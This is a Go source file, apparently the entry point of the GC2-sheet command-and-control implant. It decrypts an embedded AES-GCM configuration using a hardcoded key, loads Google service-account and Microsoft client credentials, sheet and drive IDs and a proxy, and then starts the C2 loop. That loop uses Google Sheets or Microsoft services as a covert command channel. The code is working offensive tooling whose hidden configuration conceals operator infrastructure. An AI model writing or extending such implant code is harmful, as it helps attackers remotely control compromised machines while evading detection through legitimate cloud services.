package cmd

import (
	"GC2-sheet/internal/C2"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"log"
	"net/url"

	"gopkg.in/yaml.v2"
)

//go:embed options.enc
var encryptedConfig []byte

const EncryptConfigKey = "meApAkoD31&ICQYX1&9t14@2gzCtGZSQp8mGgF%lK0Cod%t2"

type ConfigurationFile struct {
	CommandService          string `yaml:"CommandService"`
	FileSystemService       string `yaml:"FileSystemService"`
	GoogleServiceAccountKey string `yaml:"GoogleServiceAccountKey"`
	GoogleSheetID           string `yaml:"GoogleSheetID"`
	GoogleDriveID           string `yaml:"GoogleDriveID"`
	MicrosoftTenantID       string `yaml:"MicrosoftTenantID"`
	MicrosoftClientID       string `yaml:"MicrosoftClientID"`
	MicrosoftClientSecret   string `yaml:"MicrosoftClientSecret"`
	MicrosoftSiteID         string `yaml:"MicrosoftSiteID"`
	RowId                   int    `yaml:"RowId"`
	Proxy                   string `yaml:"Proxy"`
	Verbose                 bool   `yaml:"Verbose"`
}

func decryptConfig(encrypted []byte) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(string(encrypted))
	if err != nil {
		return nil, err
	}

	key := sha256.Sum256([]byte(EncryptConfigKey))

	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, err
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func Execute() {

	configurationFileContent, err := decryptConfig(encryptedConfig)
	if err != nil {
		log.Fatal("Failed to decrypt configuration")
	}

	configurationFile := ConfigurationFile{
		CommandService:        configuration.Google.String(),
		FileSystemService:     configuration.Google.String(),
		MicrosoftTenantID:     "",
		MicrosoftClientID:     "",
		MicrosoftClientSecret: "",
		MicrosoftSiteID:       "",
		RowId:                 1,
		Proxy:                 "",
		Verbose:               false,
	}

	yaml.Unmarshal(configurationFileContent, &configurationFile)

	proxyUrl, err := url.Parse(configurationFile.Proxy)

	if err != nil {
		utils.LogFatalDebug("Proxy string invalid")
	}

	if configurationFile.Proxy == "" {
		proxyUrl = nil
	}

	if (configurationFile.CommandService != configuration.Microsoft.String() && configurationFile.CommandService != configuration.Google.String()) || (configurationFile.FileSystemService != configuration.Microsoft.String() && configurationFile.FileSystemService != configuration.Google.String()) {
		log.Fatal("CommandService and FileSystemService can be only Google or Microsoft (combination is possible)")
	}

	configuration.SetOptions(configurationFile.CommandService, configurationFile.FileSystemService, configurationFile.GoogleServiceAccountKey, configurationFile.GoogleSheetID, configurationFile.GoogleDriveID, configurationFile.MicrosoftTenantID, configurationFile.MicrosoftClientID, configurationFile.MicrosoftClientSecret, configurationFile.MicrosoftSiteID, configurationFile.RowId, proxyUrl, configurationFile.Verbose)

	utils.LogDebug("Using configuration file")

	C2.Run()
}
